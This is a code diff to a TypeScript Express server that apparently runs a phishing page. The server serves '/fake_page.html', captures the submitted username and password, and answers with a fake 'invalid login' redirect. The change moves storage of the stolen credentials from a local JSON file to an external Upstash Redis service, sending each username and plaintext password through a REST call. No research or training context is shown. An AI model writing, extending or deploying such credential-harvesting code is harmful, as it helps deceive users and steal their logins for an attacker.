@@ -2,6 +2,9 @@ import express, { Request, Response } from 'express';
 import path from 'path';
 import fs from 'fs';
 import { exec } from 'child_process';
+import dotenv from 'dotenv';
+
+dotenv.config();
 
 const app = express();
 const PORT: number = 3000;
@@ -27,39 +30,29 @@ interface LoginData {
     senha: string;
     timestamp?: string;
 }
-
-const saveCredentialsToJson = (usuario: string, senha: string): void => {
-    const loginData: LoginData = {
+const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise<void> => {
+    const loginData = {
         usuario: usuario,
         senha: senha,
         timestamp: new Date().toISOString()
     };
 
-    const credentialsPath = path.join(__dirname, '../credentials.json');
-
     try {
-
-        let existingData: LoginData[] = [];
-        if (fs.existsSync(credentialsPath)) {
-            const fileContent = fs.readFileSync(credentialsPath, 'utf8').trim();
-            if (fileContent.length > 0) {
-                try {
-                    existingData = JSON.parse(fileContent);
-                } catch (parseError) {
-                    console.log('Invalid JSON in credentials.json, starting fresh');
-                    existingData = [];
-                }
+        // Save to Upstash Redis using REST API
+        const response = await fetch(`${process.env.UPSTASH_REDIS_REST_URL}/hset/user:${usuario}/usuario/${usuario}/senha/${senha}/timestamp/${loginData.timestamp}`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Bearer ${process.env.UPSTASH_REDIS_REST_TOKEN}`
             }
+        });
+
+        if (response.ok) {
+            console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}`);
+        } else {
+            console.error('Failed to save credentials to Upstash Redis');
         }
-
-        // Add new login data
-        existingData.push(loginData);
-
-        // Write back to file
-        fs.writeFileSync(credentialsPath, JSON.stringify(existingData, null, 2));
-        console.log('Credentials saved to credentials.json');
     } catch (error) {
-        console.error('Error saving credentials:', error);
+        console.error('Error saving credentials to Upstash:', error);
     }
 };
 
@@ -98,21 +91,15 @@ app.get('/fake_page.html', (req: Request, res: Response): void => {
     }
 });
 
-// Handle login form submission
-app.post('/login', (req: Request, res: Response): void => {
+app.post('/login', async (req: Request, res: Response): Promise<void> => {
     const { usuario, senha } = req.body;
 
-    // Save credentials to JSON file
-    saveCredentialsToJson(usuario, senha);
+    // Save to Upstash Redis
+    await saveCredentialsToUpstash(usuario, senha);
 
     // Log the attempt and redirect back with error
     console.log(`Login attempt saved: ${usuario}`);
     res.redirect('/fake_page.html?error=invalid');
-});
-
-// Handle help link
-app.get('/help', (req: Request, res: Response): void => {
-    res.send('<h1>Ajuda - Soluções para problemas no Acesso</h1><p>Entre em contato com o suporte técnico.</p>');
 });
 
 app.listen(PORT, (): void => {
